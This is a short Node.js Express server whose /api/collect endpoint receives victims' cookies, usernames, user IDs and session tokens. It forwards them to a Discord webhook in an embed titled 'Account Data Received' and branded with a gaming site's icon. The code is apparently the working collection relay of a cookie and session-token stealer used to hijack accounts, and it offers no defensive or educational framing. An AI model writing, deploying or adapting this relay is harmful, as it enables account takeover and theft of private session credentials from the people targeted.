const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Allow JSON bodies
app.use(express.json());

// POST endpoint: /api/collect
app.post('/api/collect', async (req, res) => {
    try {
        const { url, cookies, user } = req.body;

        // Grab the webhook from Render's environment variables (Key: webhook)
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook URL missing in environment variables!");
            return res.status(500).json({ status: "error", message: "Server misconfigured" });
        }

        if (!cookies || cookies.length === 0) {
            return res.status(400).json({ status: "error", message: "No data received" });
        }

        // Build the Discord payload
        const payload = {
            username: "Data Logger",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🦊 Account Data Received",
                color: 0x8f82c4,
                thumbnail: { url: user?.avatarUrl || "https://playvortex.io/favicon.ico" },
                fields: [
                    { name: "👤 Username", value: `**@${user?.username || 'Unknown'}**`, inline: true },
                    { name: "📛 Display Name", value: `**${user?.displayName || 'Unknown'}**`, inline: true },
                    { name: "🆔 User ID", value: `\`${user?.userId || 'Unknown'}\``, inline: false },
                    { name: "🔑 Session Token", value: `\`\`\`${user?.sessionToken || 'MISSING'}\`\`\``, inline: false },
                    { name: "📦 Raw Cookies", value: `\`\`\`${(cookies.join('; ') || '').substring(0, 950)}\`\`\``, inline: false }
                ],
                footer: { text: "Render Proxy • Logger", icon_url: "https://playvortex.io/favicon.ico" },
                timestamp: new Date().toISOString()
            }]
        };

        // Send to Discord
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            console.error("Discord webhook failed:", response.status);
            return res.status(500).json({ status: "error", message: "Webhook failed" });
        }

        console.log("Data successfully relayed to Discord!");
        return res.status(200).json({ status: "success" });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ status: "error", message: "Internal error" });
    }
});

app.get('/', (req, res) => {
    res.send('API is running.');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
